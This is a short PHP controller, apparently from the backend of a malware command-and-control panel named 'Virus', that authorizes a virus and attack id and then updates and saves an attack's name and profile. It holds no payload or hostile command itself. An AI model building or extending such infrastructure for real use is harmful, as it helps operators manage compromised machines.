<?php

use Kelvinho\Virus\Header;

$virus_id = $requestData->postCheck("virus_id");
$attack_id = $requestData->postCheck("attack_id");

$name = $requestData->postCheck("name");
$profile = $requestData->postCheck("profile");

if (!$authenticator->authorized($virus_id, $attack_id)) {
    Header::forbidden();
}

$session->set("virus_id", $virus_id);
$session->set("attack_id", $attack_id);
$attack = $attackFactory->get($attack_id);
$attack->setName($name);
$attack->setProfile($profile);
$attack->saveState();
$attack->includeController();
